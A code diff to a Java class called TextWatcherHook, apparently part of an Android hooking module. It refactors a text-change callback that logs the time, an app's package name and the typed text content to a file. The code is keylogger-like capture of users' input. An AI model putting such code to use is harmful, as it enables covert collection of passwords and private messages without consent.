@@ -40,6 +40,7 @@ public class TextWatcherHook
  class MyTextWatcher implements TextWatcher
  {
   String packageName;
+  StringBuilder sb = new StringBuilder();
   
   public MyTextWatcher(String pName)
   {
@@ -57,9 +58,11 @@ public class TextWatcherHook
   @Override
   public void afterTextChanged(Editable p1)
   {
-   writeToFile(new Date().toLocaleString().split(" ")[1]
-               + ", 包:" + packageName
-               + ", 内容:" + p1.toString());
+   sb.delete(0, sb.length());
+   sb.append(new Date().toLocaleString().split(" ")[1])
+    .append(", 包:").append(packageName)
+    .append(", 内容:").append(p1);
+   writeToFile(sb.toString());
   }
  }
  
